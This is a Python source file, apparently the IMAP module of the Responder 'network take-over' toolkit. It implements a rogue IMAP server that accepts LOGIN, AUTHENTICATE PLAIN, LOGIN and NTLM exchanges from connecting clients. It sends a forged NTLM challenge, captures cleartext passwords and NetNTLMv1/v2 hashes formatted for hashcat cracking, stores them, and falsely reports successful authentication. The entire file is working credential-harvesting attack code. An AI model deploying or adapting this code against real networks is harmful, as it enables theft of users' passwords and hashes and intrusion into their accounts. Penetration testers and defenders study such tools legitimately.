#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
import base64
import re
import struct
import os
from utils import *

if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

from packets import IMAPGreeting, IMAPCapability, IMAPCapabilityEnd

class IMAP(BaseRequestHandler):
	def handle(self):
		try:
			# Send greeting
			self.request.send(NetworkSendBufferPython2or3(IMAPGreeting()))
			
			# Main loop to handle multiple commands
			while True:
				data = self.request.recv(1024)
				
				if not data:
					break
				
				# Handle CAPABILITY command
				if b'CAPABILITY' in data.upper():
					RequestTag = self.extract_tag(data)
					self.request.send(NetworkSendBufferPython2or3(IMAPCapability()))
					self.request.send(NetworkSendBufferPython2or3(IMAPCapabilityEnd(Tag=RequestTag)))
					continue
				
				# Handle LOGIN command
				if b'LOGIN' in data.upper():
					success = self.handle_login(data)
					if success:
						break
					continue
				
				# Handle AUTHENTICATE PLAIN
				if b'AUTHENTICATE PLAIN' in data.upper():
					success = self.handle_authenticate_plain(data)
					if success:
						break
					continue
				
				# Handle AUTHENTICATE LOGIN
				if b'AUTHENTICATE LOGIN' in data.upper():
					success = self.handle_authenticate_login(data)
					if success:
						break
					continue
				
				# Handle AUTHENTICATE NTLM
				if b'AUTHENTICATE NTLM' in data.upper():
					success = self.handle_authenticate_ntlm(data)
					if success:
						break
					continue
				
				# Handle LOGOUT
				if b'LOGOUT' in data.upper():
					RequestTag = self.extract_tag(data)
					response = "* BYE IMAP4 server logging out\r\n"
					response += "%s OK LOGOUT completed\r\n" % RequestTag
					self.request.send(NetworkSendBufferPython2or3(response))
					break
				
				# Unknown command - send error
				RequestTag = self.extract_tag(data)
				response = "%s BAD Command not recognized\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[IMAP] Exception: %s' % str(e)))
			pass
	
	def extract_tag(self, data):
		"""Extract IMAP command tag (e.g., 'A001' from 'A001 LOGIN ...')"""
		try:
			parts = data.decode('latin-1', errors='ignore').split()
			if parts:
				return parts[0]
		except:
			pass
		return "A001"
	
	def handle_login(self, data):
		"""
		Handle LOGIN command
		Format: TAG LOGIN username password
		Credentials can be quoted or unquoted
		"""
		try:
			RequestTag = self.extract_tag(data)
			
			# Decode the data
			data_str = data.decode('latin-1', errors='ignore').strip()
			
			# Remove tag and LOGIN command
			# Pattern: TAG LOGIN credentials
			login_match = re.search(r'LOGIN\s+(.+)', data_str, re.IGNORECASE)
			if not login_match:
				response = "%s BAD LOGIN command syntax error\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
			
			credentials_part = login_match.group(1).strip()
			
			# Parse credentials - can be quoted or unquoted
			username, password = self.parse_credentials(credentials_part)
			
			if username and password:
				# Save credentials
				SaveToDb({
					'module': 'IMAP', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': username, 
					'cleartext': password, 
					'fullhash': username + ":" + password,
				})
				
				if settings.Config.Verbose:
					print(text('[IMAP] LOGIN captured: %s:%s from %s' % (
						username, password, self.client_address[0])))
				
				# Send success but then close
				response = "%s OK LOGIN completed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return True
			else:
				# Invalid credentials format
				response = "%s BAD LOGIN credentials format error\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
		
		except Exception as e:
			return False
	
	def parse_credentials(self, creds_str):
		"""
		Parse username and password from LOGIN command
		Supports: "user" "pass", user pass, {5}user {8}password (literal strings)
		"""
		try:
			# Method 1: Quoted strings "user" "pass"
			quoted_match = re.findall(r'"([^"]*)"', creds_str)
			if len(quoted_match) >= 2:
				return quoted_match[0], quoted_match[1]
			
			# Method 2: Space-separated (unquoted)
			parts = creds_str.split()
			if len(parts) >= 2:
				# Remove any curly brace literals {5}
				user = re.sub(r'^\{\d+\}', '', parts[0])
				passwd = re.sub(r'^\{\d+\}', '', parts[1])
				return user, passwd
			
			return None, None
		
		except:
			return None, None
	
	def handle_authenticate_plain(self, data):
		"""
		Handle AUTHENTICATE PLAIN command
		Can be single-line or multi-line
		"""
		try:
			RequestTag = self.extract_tag(data)
			
			# Check if credentials are on the same line
			data_str = data.decode('latin-1', errors='ignore').strip()
			plain_match = re.search(r'AUTHENTICATE\s+PLAIN\s+(.+)', data_str, re.IGNORECASE)
			
			if plain_match:
				# Single-line format: TAG AUTHENTICATE PLAIN <base64>
				b64_creds = plain_match.group(1).strip()
			else:
				# Multi-line format: TAG AUTHENTICATE PLAIN
				# Server sends: +
				# Client sends: <base64>
				response = "+\r\n"
				self.request.send(NetworkSendBufferPython2or3(response))
				
				# Get base64 credentials
				cred_data = self.request.recv(1024)
				if not cred_data:
					return False
				
				b64_creds = cred_data.decode('latin-1', errors='ignore').strip()
			
			# Decode base64 credentials
			# Format: \0username\0password or username\0username\0password
			try:
				decoded = base64.b64decode(b64_creds).decode('latin-1', errors='ignore')
				parts = decoded.split('\x00')
				
				# Skip first part if it's authorization identity (usually empty)
				if len(parts) >= 3:
					username = parts[1]
					password = parts[2]
				elif len(parts) >= 2:
					username = parts[0]
					password = parts[1]
				else:
					raise ValueError("Invalid PLAIN format")
				
				if username and password:
					# Save credentials
					SaveToDb({
						'module': 'IMAP', 
						'type': 'Cleartext', 
						'client': self.client_address[0], 
						'user': username, 
						'cleartext': password, 
						'fullhash': username + ":" + password,
					})
					
					if settings.Config.Verbose:
						print(text('[IMAP] AUTHENTICATE PLAIN captured: %s:%s from %s' % (
							username, password, self.client_address[0])))
					
					# Send success
					response = "%s OK AUTHENTICATE completed\r\n" % RequestTag
					self.request.send(NetworkSendBufferPython2or3(response))
					return True
			
			except Exception as e:
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
		
		except Exception as e:
			return False
	
	def handle_authenticate_login(self, data):
		"""
		Handle AUTHENTICATE LOGIN command
		Server prompts for username, then password (both base64 encoded)
		"""
		try:
			RequestTag = self.extract_tag(data)
			
			# Prompt for username
			response = "+ " + base64.b64encode(b"Username:").decode('latin-1') + "\r\n"
			self.request.send(NetworkSendBufferPython2or3(response))
			
			# Get username (base64 encoded)
			user_data = self.request.recv(1024)
			if not user_data:
				return False
			
			username_b64 = user_data.decode('latin-1', errors='ignore').strip()
			username = base64.b64decode(username_b64).decode('latin-1', errors='ignore')
			
			# Prompt for password
			response = "+ " + base64.b64encode(b"Password:").decode('latin-1') + "\r\n"
			self.request.send(NetworkSendBufferPython2or3(response))
			
			# Get password (base64 encoded)
			pass_data = self.request.recv(1024)
			if not pass_data:
				return False
			
			password_b64 = pass_data.decode('latin-1', errors='ignore').strip()
			password = base64.b64decode(password_b64).decode('latin-1', errors='ignore')
			
			if username and password:
				# Save credentials
				SaveToDb({
					'module': 'IMAP', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': username, 
					'cleartext': password, 
					'fullhash': username + ":" + password,
				})
				
				if settings.Config.Verbose:
					print(text('[IMAP] AUTHENTICATE LOGIN captured: %s:%s from %s' % (
						username, password, self.client_address[0])))
				
				# Send success
				response = "%s OK AUTHENTICATE completed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return True
			else:
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
		
		except Exception as e:
			return False
	
	def handle_authenticate_ntlm(self, data):
		"""
		Handle AUTHENTICATE NTLM command
		Implements NTLM challenge-response authentication
		Captures NetNTLMv2 hashes
		"""
		try:
			RequestTag = self.extract_tag(data)
			
			# Send continuation to receive Type 1 message
			response = "+\r\n"
			self.request.send(NetworkSendBufferPython2or3(response))
			
			# Receive Type 1 message (NTLM Negotiate)
			type1_data = self.request.recv(2048)
			if not type1_data:
				return False
			
			type1_b64 = type1_data.decode('latin-1', errors='ignore').strip()
			
			try:
				type1_msg = base64.b64decode(type1_b64)
			except:
				return False
			
			# Generate Type 2 message (NTLM Challenge)
			type2_msg = self.generate_ntlm_type2()
			type2_b64 = base64.b64encode(type2_msg).decode('latin-1')
			
			# Send Type 2 challenge
			response = "+ %s\r\n" % type2_b64
			
			self.request.send(NetworkSendBufferPython2or3(response))
			
			# Receive Type 3 message (NTLM Authenticate)
			type3_data = self.request.recv(4096)
			if not type3_data:
				return False
			
			type3_b64 = type3_data.decode('latin-1', errors='ignore').strip()
			
			# Check for cancellation (* means cancel)
			if type3_b64 == '*' or type3_b64 == '':
				if settings.Config.Verbose:
					print(text('[IMAP] Client cancelled NTLM authentication'))
				response = "%s NO AUTHENTICATE cancelled\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
			
			# Check if response looks like base64
			if not all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\r\n' for c in type3_b64):
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
			
			try:
				type3_msg = base64.b64decode(type3_b64)
			except Exception as e:
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
			
			# Parse Type 3 message and extract NetNTLMv2 hash
			ntlm_hash = self.parse_ntlm_type3(type3_msg, type2_msg)
			
			if ntlm_hash:
				if settings.Config.Verbose:
					print(text('[IMAP] NTLM hash captured: %s from %s' % (
						ntlm_hash['user'], self.client_address[0])))
				
				# Save to database
				SaveToDb(ntlm_hash)
				
				# Send success (even though auth "succeeded", connection will close)
				response = "%s OK AUTHENTICATE completed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return True
			else:
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
		
		except Exception as e:
			return False
	
	def generate_ntlm_type2(self):
		"""
		Generate NTLM Type 2 (Challenge) message
		Includes target name and target info for NTLMv2 compatibility
		"""
		import time
		
		# Generate random 8-byte challenge
		challenge = os.urandom(8)
		
		# Store challenge for later verification (in practice, we don't verify)
		self.ntlm_challenge = challenge
		
		# Target name - use a generic domain name
		# Encoding in UTF-16LE as required by NTLM
		target_name = b'W\x00O\x00R\x00K\x00G\x00R\x00O\x00U\x00P\x00'  # "WORKGROUP" in UTF-16LE
		target_name_len = len(target_name)
		
		# Build Target Info (AV pairs) for NTLMv2
		# This is CRITICAL for Thunderbird and other strict NTLM implementations
		target_info = b''
		
		# AV_PAIR: MsvAvNbDomainName (0x0002)
		domain_name = b'W\x00O\x00R\x00K\x00G\x00R\x00O\x00U\x00P\x00'
		target_info += struct.pack('<HH', 0x0002, len(domain_name))
		target_info += domain_name
		
		# AV_PAIR: MsvAvNbComputerName (0x0001)
		computer_name = b'S\x00E\x00R\x00V\x00E\x00R\x00'  # "SERVER" in UTF-16LE
		target_info += struct.pack('<HH', 0x0001, len(computer_name))
		target_info += computer_name
		
		# AV_PAIR: MsvAvDnsDomainName (0x0004)
		dns_domain = b'w\x00o\x00r\x00k\x00g\x00r\x00o\x00u\x00p\x00'  # "workgroup" in UTF-16LE
		target_info += struct.pack('<HH', 0x0004, len(dns_domain))
		target_info += dns_domain
		
		# AV_PAIR: MsvAvDnsComputerName (0x0003)
		dns_computer = b's\x00e\x00r\x00v\x00e\x00r\x00'  # "server" in UTF-16LE
		target_info += struct.pack('<HH', 0x0003, len(dns_computer))
		target_info += dns_computer
		
		# AV_PAIR: MsvAvTimestamp (0x0007) - Critical for NTLMv2!
		# Windows FILETIME: 100-nanosecond intervals since Jan 1, 1601
		timestamp = int((time.time() + 11644473600) * 10000000)
		target_info += struct.pack('<HH', 0x0007, 8)
		target_info += struct.pack('<Q', timestamp)
		
		# AV_PAIR: MsvAvEOL (0x0000) - Terminator
		target_info += struct.pack('<HH', 0x0000, 0)
		
		target_info_len = len(target_info)
		
		# Calculate offsets
		target_name_offset = 48  # After fixed header
		target_info_offset = target_name_offset + target_name_len
		
		# Build Type 2 message structure
		signature = b'NTLMSSP\x00'
		msg_type = struct.pack('<I', 2)  # Type 2
		
		# Target name security buffer
		target_name_fields = struct.pack('<HHI', target_name_len, target_name_len, target_name_offset)
		
		# Flags - Use EXACT same as HTTP server (proven to work!)
		# 0xa2810205 = NEGOTIATE_UNICODE (0x01) + REQUEST_TARGET (0x04) +
		#              NEGOTIATE_NTLM (0x200) + NEGOTIATE_EXTENDED_SESSIONSECURITY (0x10000) +
		#              NEGOTIATE_128 (0x20000000) + NEGOTIATE_56 (0x80000000)
		# Critical: NEGOTIATE_128 and NEGOTIATE_56 are REQUIRED for proper NTLMv2!
		# Note: HTTP does NOT set NEGOTIATE_TARGET_INFO flag
		flags = b'\x05\x02\x81\xa2'  # Same bytes as Responder HTTP server
		
		# Context (reserved, 8 bytes of zeros)
		context = b'\x00' * 8
		
		# Target info security buffer
		target_info_fields = struct.pack('<HHI', target_info_len, target_info_len, target_info_offset)
		
		# Build complete message: header + target_name + target_info
		type2_msg = (signature + msg_type + target_name_fields + flags + 
					 challenge + context + target_info_fields + target_name + target_info)
		
		return type2_msg
	
	def parse_ntlm_type3(self, type3_msg, type2_msg):
		"""
		Parse NTLM Type 3 (Authenticate) message
		Extract NetNTLMv2 hash in hashcat format
		"""
		try:
			from binascii import hexlify
			
			# Verify signature
			if type3_msg[:8] != b'NTLMSSP\x00':
				return None
			
			# Verify message type
			msg_type = struct.unpack('<I', type3_msg[8:12])[0]
			if msg_type != 3:
				return None
			
			# Parse security buffers
			# LM Response
			lm_len, lm_maxlen, lm_offset = struct.unpack('<HHI', type3_msg[12:20])
			
			# NTLM Response
			ntlm_len, ntlm_maxlen, ntlm_offset = struct.unpack('<HHI', type3_msg[20:28])
			
			# Domain name
			domain_len, domain_maxlen, domain_offset = struct.unpack('<HHI', type3_msg[28:36])
			
			# User name
			user_len, user_maxlen, user_offset = struct.unpack('<HHI', type3_msg[36:44])
			
			# Workstation name
			ws_len, ws_maxlen, ws_offset = struct.unpack('<HHI', type3_msg[44:52])
			
			# Extract fields
			if user_offset + user_len <= len(type3_msg):
				user = type3_msg[user_offset:user_offset+user_len].decode('utf-16le', errors='ignore')
			else:
				user = "unknown"
			
			if domain_offset + domain_len <= len(type3_msg):
				domain = type3_msg[domain_offset:domain_offset+domain_len].decode('utf-16le', errors='ignore')
			else:
				domain = ""
			
			# DO NOT parse email addresses - hashcat needs exact Type 3 fields
			# If username is "user@domain.com" and domain is "", that's what hashcat expects
			
			if ws_offset + ws_len <= len(type3_msg):
				workstation = type3_msg[ws_offset:ws_offset+ws_len].decode('utf-16le', errors='ignore')
			else:
				workstation = ""
			
			# Extract NTLM response
			if ntlm_offset + ntlm_len <= len(type3_msg):
				ntlm_response = type3_msg[ntlm_offset:ntlm_offset+ntlm_len]
			else:
				return None
			
			# Check if NTLMv2 (response length > 24 bytes)
			if len(ntlm_response) > 24:
				# NTLMv2
				ntlmv2_response = ntlm_response[:16]  # First 16 bytes
				ntlmv2_blob = ntlm_response[16:]      # Rest is the blob
				
				# Extract challenge from Type 2
				challenge = type2_msg[24:32]  # Challenge is at offset 24
				
				# Build hashcat NetNTLMv2 format
				# Format: username::domain:challenge:ntlmv2_response:blob
				# For hashcat mode 5600
				hash_str = "%s::%s:%s:%s:%s" % (
					user,
					domain,
					hexlify(challenge).decode(),
					hexlify(ntlmv2_response).decode(),
					hexlify(ntlmv2_blob).decode()
				)
				
				if settings.Config.Verbose:
					print(text('[IMAP] NetNTLMv2 hash format (hashcat -m 5600)'))
				
				return {
					'module': 'IMAP',
					'type': 'NetNTLMv2',
					'client': self.client_address[0],
					'user': user,
					'domain': domain,
					'hash': hash_str,
					'fullhash': hash_str
				}
			else:
				# NTLMv1
				ntlm_hash = ntlm_response[:24]
				
				# Extract challenge
				challenge = type2_msg[24:32]
				
				# Build hashcat NetNTLMv1 format
				# Format: username::domain:lm_hash:ntlm_hash:challenge
				# For hashcat mode 5500
				
				# Extract LM response if present
				if lm_offset + lm_len <= len(type3_msg) and lm_len == 24:
					lm_hash = type3_msg[lm_offset:lm_offset+lm_len]
				else:
					lm_hash = b'\x00' * 24
				
				hash_str = "%s::%s:%s:%s:%s" % (
					user,
					domain,
					hexlify(lm_hash).decode(),
					hexlify(ntlm_hash).decode(),
					hexlify(challenge).decode()
				)
				
				if settings.Config.Verbose:
					print(text('[IMAP] NetNTLMv1 hash format (hashcat -m 5500)'))
				
				return {
					'module': 'IMAP',
					'type': 'NetNTLMv1',
					'client': self.client_address[0],
					'user': user,
					'domain': domain,
					'hash': hash_str,
					'fullhash': hash_str
				}
		
		except Exception as e:
			return None
